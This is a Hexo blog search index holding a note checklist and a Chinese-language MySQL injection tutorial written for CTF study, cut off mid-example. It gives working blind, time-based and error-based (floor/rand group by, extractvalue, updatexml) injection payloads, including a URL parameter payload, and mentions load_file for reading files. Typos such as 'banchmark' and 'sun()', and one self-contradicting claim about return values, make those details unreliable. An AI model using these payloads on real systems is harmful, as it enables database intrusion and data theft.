<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>笔记清单</title>
    <link href="/tuyi/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/"/>
    <url>/tuyi/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<ul><li><input disabled="" type="checkbox"> 反序列化(PyYAML)</li><li><input disabled="" type="checkbox"> xss指北</li><li><input disabled="" type="checkbox"> xxe指北</li><li><input disabled="" type="checkbox"> Xpath注入指北</li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/19/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/pker/">pker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">PHP原生类介绍</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议介绍</a></li><li><input disabled="" type="checkbox"> Oracle注入指北</li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Mysql注入指北</a></li><li><input disabled="" type="checkbox"> MongDB注入指北</li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/27/%E8%AE%BADNS/">论DNS</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>导航</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql注入指北</title>
    <link href="/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>祝大家新年快乐</p><p>sql注入和xss并称为落魄的漏洞之王，虽然被研究的透透的了，但是现在的ctf比赛还是存在很多这样的题目，各种各样的 payload，不但琐碎而且不成体系,实际上很多技巧都是根据语法来的。即如果知道基本语法，那么对注入的 payload 也就能了然于胸</p><h1 id="Mysql注入学习"><a href="#Mysql注入学习" class="headerlink" title="Mysql注入学习"></a>Mysql注入学习</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20190407031440214.png" alt="20190407031440214"></p><p>首先，语法为从上到下。</p><p>简化之前的导图为 MySQL 所有的语法。其实在注入的过程中用不着这么详细，看看就好，有需要再查也不迟。简化的版本则为 MySQL 注入中常见的语法。</p><p>颜色表示：红色代表一定不能省略，橙色代表部分情况下能省略，灰色代表总是可以省略。红色与灰色好懂，橙色是个啥呢？拿 <code>GROUP BY</code> 为例，意思指的是，假如我们选了 <code>GROUP BY</code>，那么一定要对 <code>col_name</code>、<code>expr</code>、<code>position</code> 进行三选一。根据从上到下的顺序，接下来是 <code>ASC</code>、<code>DESC</code> 二选一，可选可不选。如果我们没使用 <code>GROUP BY</code>，那么就不需要进行三选一，因为流程没到这里。总结起来就是，如果下一步中存在橙色的语法，就一定要用到。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><ol><li>group by：select + group by 的时候，是先 group by，再从 group by 里 select。所以 select 的列一定要在 group by 里存在。</li><li>语句执行成功返回值有2种情况，第一种本身返回数字的，就为数字，即：<code>select (select database());</code> 的返回值为 1；否则，执行成功为 0，反之为 1。即：<code>select (select database());</code> 的返回值为 0</li></ol><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>系统自带的数据库往往是很有用的，数据不仅全面，而且权限高的很。</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p><code>information_schema</code> 提供了访问数据库元数据的方式。什么是<code>元数据</code>呢？就是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>有用的表如下：</p><ul><li>schemata：提供了当前 mysql 实例中所有数据库的信息。’show databases;<code>的结果就是从这个表的</code>SCHEMA_NAME&#96; 字段来的。</li><li>tables：详细记载了所有的表的名字，以及哪个表属于哪个 schema、表的类型、表的引擎、创建时间等等信息。<code>show tables</code> 的结果就是从这个表的 <code>TABLE_NAME</code> 字段来的。</li></ul><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>mysql</code> 数据库是 mysql 的核心数据库，，主要负责存储数据库的用户、权限设置、关键字等 mysql 自己需要使用的控制和管理信息。</p><p>有用的表如下：</p><ul><li>user：<code>user</code> 表中记录了用户信息，包括用户可登陆的 ip（host 字段）、用户名（User 字段）、密码 hash（authentication_string 字段）、是否有读取文件的权限（file_priv 字段）等等。注意，对于 mysql <code>5.7</code> 以上的版本，密码的 hash 字段不再是 <code>Password</code>，而是 <code>authentication_string</code>。</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>MySQL 自带的变量的特征就是开头 <code>@@</code></p><ol><li><code>@@basedir</code>：MySQL 的安装路径</li><li><code>@@datadir</code>： MySQL 的数据库文件，即数据文件路径</li><li><code>@@version_compile_os</code>：操作系统</li><li><code>@@version</code>：数据库版本</li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>这些函数在注入的过程中能帮助我们不少忙。参数通常可以为 sql 语句（要加括号）</p><h3 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h3><ul><li><code>user()</code>：当前连接的数据库用户</li><li><code>version()</code>：数据库版本</li></ul><h3 id="字符串相关函数"><a href="#字符串相关函数" class="headerlink" title="字符串相关函数"></a>字符串相关函数</h3><ul><li><p>mid：</p><ul><li><p>截取字符串的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mid(string, start[, length])<br></code></pre></td></tr></table></figure><ul><li>string：字符串，</li><li>start：起始位置，起始位置为 1</li><li>length：截取长度</li></ul></li></ul></li><li><p>substr：</p><ul><li><p>截取字符串的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substr(string, start, length)<br></code></pre></td></tr></table></figure><ul><li>string：字符串</li><li>start：起始位置，起始位置为 1</li><li>length：截取长度</li></ul></li></ul></li><li><p>substring：同 <code>substr</code></p></li></ul><p><strong>以上函数的参数均可以用 <code>from start for end</code> 代替</strong>，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select substring(&#x27;fuck&#x27; from 2 for 2);#从第二个字符开始截取长度是2<br>+--------------------------------+<br>| substring(&#x27;fuck&#x27; from 2 for 2) |<br>+--------------------------------+<br>| uc                             |<br>+--------------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><ul><li><p>hex：将数字&#x2F;字符串转为<code>十六进制</code>。特别是字符串，防止有特殊字符导致出现各种奇怪的问题。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">hex(char)<br></code></pre></td></tr></table></figure></li><li><p>unhex：将十六进制转为字符串。注意，结果会直接转为对应的 acii 码，例如 <code>unhex(6D7973716C)</code> 的结果是 <code>mysql</code> 而不是 <code>470189044076</code></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">unhex(data)<br></code></pre></td></tr></table></figure></li><li><p>length：</p><ul><li><p>返回字符串长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">length(string)<br></code></pre></td></tr></table></figure><ul><li>string：字符串</li></ul></li></ul></li><li><p>left：</p><ul><li><p>获取字符串左边数起指定个数的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">left(string, n)<br></code></pre></td></tr></table></figure><ul><li>string：要截取的字符串</li><li>n：长度</li></ul></li></ul></li><li><p>ord：</p><ul><li><p>获取字符的 ASCII 码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ord(char)<br></code></pre></td></tr></table></figure><ul><li>char：字符&#x2F;字符串（如果是字符串，则取它的第一个字符）</li></ul></li></ul></li><li><p>ascii：同 <code>ord</code></p></li><li><p>char：</p><ul><li><p>将 ASCII 码转为字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">char(a[, ...])<br></code></pre></td></tr></table></figure><ul><li>a：数字；后面可以加多个 ASCII 码，即构成字符串。</li></ul></li></ul></li><li><p>regexp：</p><ul><li><p>正则匹配，匹配到返回 1，反之为 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">string1 regexp string2<br></code></pre></td></tr></table></figure><ul><li>string1：匹配的字符串</li><li>string2：正则表达式</li></ul></li></ul></li><li><p>concat：</p><ul><li><p>连接（多个）字符串（数字），返回字符串。如果有任何一个参数为 null，则返回值为 null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat(string[, ...])<br></code></pre></td></tr></table></figure><ul><li>string：任意值</li></ul></li></ul></li><li><p>concat_ws</p><ul><li><p>和 concat 类似，将多个字符串连接成一个字符串，但是可以指定连接符。如果有任何一个参数为 null，对返回值无影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat_ws(sep, string[, ...])<br></code></pre></td></tr></table></figure><ul><li>sep：连接符</li><li>string：任意值</li></ul></li></ul></li><li><p>group_concat</p><ul><li><p>将 group by 产生的同一个分组中的值连接起来，成为一个字符串并返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">group_concat([distinct] colname [order by colname asc/desc ][separator sep])<br></code></pre></td></tr></table></figure><ul><li>distinct：去重</li><li>colname：列名</li><li>sep：分隔符</li></ul></li></ul></li></ul><h3 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h3><ul><li><p>sleep：</p><ul><li><p>延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sleep(sec)<br></code></pre></td></tr></table></figure><ul><li>sec：秒</li></ul></li></ul></li><li><p>banchmark：</p><ul><li><p>重复执行函数，较占用 cpu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">banchmark(count, func)<br></code></pre></td></tr></table></figure><ul><li>count：执行的次数</li><li>func：函数</li></ul></li></ul></li><li><p><strong>笛卡尔积</strong></p><p> 笛卡尔积(因为连接表是一个很耗时的操作)</p><p> AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT count(*) FROM information_schema.columns A, <br>information_schema.columns B, information_schema.tables C;<br>select * from table_name A, table_name B<br>select * from table_name A, table_name B，table_name C<br>select count(*) from table_name A, table_name B，table_name C <br></code></pre></td></tr></table></figure><p> 表可以是同一张表,受服务器性能影响很大</p></li></ul><p>另外，利用 <code>带外通道</code> 发起网络请求，也有可能造成时延。不过 MySQL 的带外通道只能在 Windows 下利用 <code>LOAD_FILE</code> 完成。</p><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><ul><li><p><strong>ABS(x)</strong></p><ul><li>返回 <code>x</code> 的绝对值。</li><li>示例：<code>select abs(-5);</code> → 结果 <code>5</code></li></ul></li><li><p><strong>CEIL(x)</strong> 或 <strong>CEILING(x)</strong></p><ul><li>返回不小于 <code>x</code> 的最小整数（向上取整）。</li><li>示例：<code>select ceil(3.2);</code> → 结果 <code>4</code></li></ul></li><li><p><strong>FLOOR(x)</strong></p><ul><li>返回不大于 <code>x</code> 的最大整数（向下取整）。</li><li>示例：<code>select floor(3.8);</code> → 结果 <code>3</code></li></ul></li><li><p><strong>ROUND(x, d)</strong></p><ul><li>将 <code>x</code> 四舍五入到 <code>d</code> 位小数（默认为 <code>d=0</code>）。</li><li>示例：<code>select round(3.1415, 2);</code> → 结果 <code>3.14</code></li></ul></li><li><p><strong>RAND()</strong></p><ul><li><p>生成 0 到 1 之间的随机浮点数。</p></li><li><p>示例：<code>select rand();</code> → 结果类似 <code>0.5487</code></p></li><li><p>生成范围随机整数（如 1-100）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select floor(rand() * 100) + 1;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>POW(x, y)</strong> 或 <strong>POWER(x, y)</strong></p><ul><li>返回 <code>x</code> 的 <code>y</code> 次方。</li><li>示例：<code>select pow(2, 3);</code> → 结果 <code>8</code></li></ul></li><li><p><strong>SQRT(x)</strong></p><ul><li>返回 <code>x</code> 的平方根（若 <code>x</code> 为负数，返回 <code>NULL</code>）。</li><li>示例：<code>select sqrt(16);</code> → 结果 <code>4</code></li></ul></li></ul><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><ol><li><p><strong>COUNT()</strong></p><ul><li><p>统计行数或非 NULL 值的数量。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 统计总行数（包括NULL）<br>select count(*) from orders;<br><br>-- 统计某列非NULL值的数量<br>select count(product_id) from products;<br><br>-- 统计唯一值数量<br>select count(distinct user_id) from logs;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>SUM()</strong></p><ul><li><p>计算数值列的总和（忽略 NULL）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sun(revenue) from sales;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>AVG()</strong></p><ul><li><p>计算数值列的平均值（忽略 NULL）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select avg(score) from exams;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>MAX()</strong> 和 <strong>MIN()</strong></p><ul><li><p>返回列中的最大&#x2F;最小值（支持数值、日期、字符串）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select max(temperature), min(temperature) from weather;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><ul><li><p>greatest：</p><ul><li><p>返回 a, b 中最大的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">greatest(a, b)<br></code></pre></td></tr></table></figure><ul><li>a、b：任意值</li></ul></li></ul></li><li><p>rand：</p><ul><li><p>返回 0~1 之间随机的浮点值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">rand(a)<br></code></pre></td></tr></table></figure><ul><li>a：可选参数；随机数种子；可为任意值</li></ul></li></ul></li><li><p>load_file</p><ul><li><p>读取文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">load_file(path)<br></code></pre></td></tr></table></figure><ul><li>path：文件路径，一般转为 16 进制防止特殊字符出问题</li></ul></li></ul></li><li><p>extractvalue</p><ul><li><p>对 XML 文档进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">extractvalue(xmlfile，path)<br></code></pre></td></tr></table></figure><ul><li>xmlfile：xml 文件</li><li>path：xpath</li></ul></li></ul></li><li><p>updatexml</p><ul><li><p>更新 xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(xmlfile，path, content)<br></code></pre></td></tr></table></figure><ul><li>xmlfile：xml 文件</li><li>path：xpath</li><li>content：更新的内容</li></ul></li></ul></li></ul><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>到此为止，我们基本上复习了一下 MySQL 注入相关的知识，接下来看看有哪些类型的注入。</p><h3 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h3><p>注入后直接回显结果</p><p>有点多写好了贴这里</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>类型</p><ul><li>布尔</li><li>时间</li><li>其他（报错、响应代码等等）</li></ul><p>盲注就是在 sql 注入过程中，数据无回显。此时，我们需要利用一些方法进行判断注入是否成功，这个方法称之为盲注。</p><p>盲注实际上是根据执行成功与失败的现象不同，导致攻击者能够获取到信息。最简单的是布尔型的，通过比较运算符来获得信息，比较结果要么是 True，要么是 False，两种返回的数据不同。那么如果不管是 True 还是 False，页面返回的都一样的话，就只能用基于时间的盲注，加入特定的时间函数，通过时间差来判断注入的语句是否正确。</p><p>从上面可以看出，只要注入成功与失败的返回数据不同，我们就可以获取到数据库的信息。至于返回的数据到底怎么个不同法，则有很多种可能。</p><p>利用方式</p><ol><li><p>基于布尔<br>利用字符串相关的函数，逐个字符猜解需要的信息即可</p></li><li><p>基于时间</p><ul><li><p>利用 <code>if</code>、<code>case</code>等与时延函数搭配，逐个字符猜解需要的信息</p></li><li><p>利用字符串提前与定位将字符转为数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;a&#x27;));<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;b&#x27;));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;r&#x27;));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><p>同理可以获取所有位数。此法无需 if 等条件语句。</p><p>同样还可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;a&#x27;, 1));<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;b&#x27;, 1));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;r&#x27;, 1));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><p>判断长度也可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(length(database())-1);<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-2);<br>...<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-14);<br># 没有时延说明长度为 14<br></code></pre></td></tr></table></figure></li></ul><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 MySQL 的一些特殊语法触发错误，错误中常常带着一些数据库信息，从而造成信息泄露，达到注入的目的。以下是几个常见的 payload：</p><blockquote><p>floor + rand + count + group by 组合拳</p></blockquote><p>先说 <code>group by</code>。当 <code>group by</code> 与聚合函数（这里是 count）一起使用的时候，MySQL 会为查询结果建立一个虚拟的表。这个表你可以按照 Python 的里的字典理解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_table = &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>与字典类似，这个临时的表不能创建相同的键，出现了就报错；如果出现相同的值，则累加。举例：<br>假如查出了一个新的值 a，那么 MySQL 先找一下临时表中有没有这个 a 键，有的话更新对于的值；否则创建一个新的键。如果创建新的键的时候发现已经存在这个键了，则会报错。那么问题来了，创建键的之前明明有对键的存在进行判断，为什么创建的时候还会出现存在呢？因为判断的时候 MySQL 会进行一次查询，而创建的时候又会查一下，相当于重复查了 2 次。又因为 <code>rand</code> 函数每次运行的结果不同，便导致了判断与创建的键会不一致的情况。</p><p>当然，0~1 之间的随机浮点数结果太多了，需要限制一下来提高几率，这就是 <code>floor(rand()*2)</code> 的作用，将随机结果限制为2种，要么 0 要么 1。<br>举例说明，当 <code>group by</code> + <code>floor(rand(0)*2)</code> 的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0, 5;<br>+------------------+<br>| floor(rand(0)*2) |<br>+------------------+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>+------------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>结果解释：</p><ol><li>第一次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1。</li><li>第二次查询，随机数为 1，<code>group by</code> 拿到键 1，判断键 1 在临时表后，更新键 1 对应的值。</li><li>第三次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1，但是键 1已经存在，所以 MySQL 报错：<code>ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</code></li></ol><p>验证如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+----------+----------+<br>| id   | user     | password |<br>+------+----------+----------+<br>|    1 | admin    | admin    |<br>|    2 | root     | password |<br>|    3 | username | 123456   |<br>+------+----------+----------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br><br></code></pre></td></tr></table></figure><p>实际上，group by 的次数与列数密切相关，也就是说，如果将 <code>users</code> 表改为 2列，则不会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+-------+----------+<br>| id   | user  | password |<br>+------+-------+----------+<br>|    1 | admin | admin    |<br>|    2 | root  | password |<br>+------+-------+----------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>+----------+<br>| count(*) |<br>+----------+<br>|        2 |<br>+----------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>剩下的，就是怎么利用报错将需要的数据带出来。报错中的 <code>1</code> 实际上就是 <code>floor(rand(0)*2)</code> 的结果，所以只需要将数据与 <code>floor(rand(0)*2)</code> 连接起来就可以带出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select count(*) from users group by concat((floor(rand(0)*2)), &quot;~&quot;,version());<br>ERROR 1062 (23000): Duplicate entry &#x27;1~5.7.24&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br></code></pre></td></tr></table></figure><p>实战示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1 or 1 group by concat((floor(rand(0)*2)), &quot;~&quot;, version()) -- #<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version() 也可以为 group_concat( select 语句 )<br></code></pre></td></tr></table></figure><blockquote><p>xml</p></blockquote><p>利用 xml 的 xpath 语法错误来报错。</p><p><strong>extractvalue</strong>: extractvalue 在查不到数据的时候返回空，xpath 语法错误的时候则会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/&#x27;);<br>+--------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/&#x27;) |<br>+--------------------------+<br>| 123                      |<br>+--------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;);<br>+---------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;) |<br>+---------------------------+<br>|                           |<br>+---------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~&#x27;<br></code></pre></td></tr></table></figure><p><strong>updatexml</strong>：与 extractvalue 类似。</p><p>注意，这两种报错注入，能够提取的最长字符串为 32 个字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br>mysql&gt; select updatexml(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;, &#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br></code></pre></td></tr></table></figure><p>~替换为select语句</p><p>实战示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and extractvalue(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;));<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and updatexml(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;), &#x27;&#x27;); <br>ERROR 1105 (HY000): XPATH syntax error: 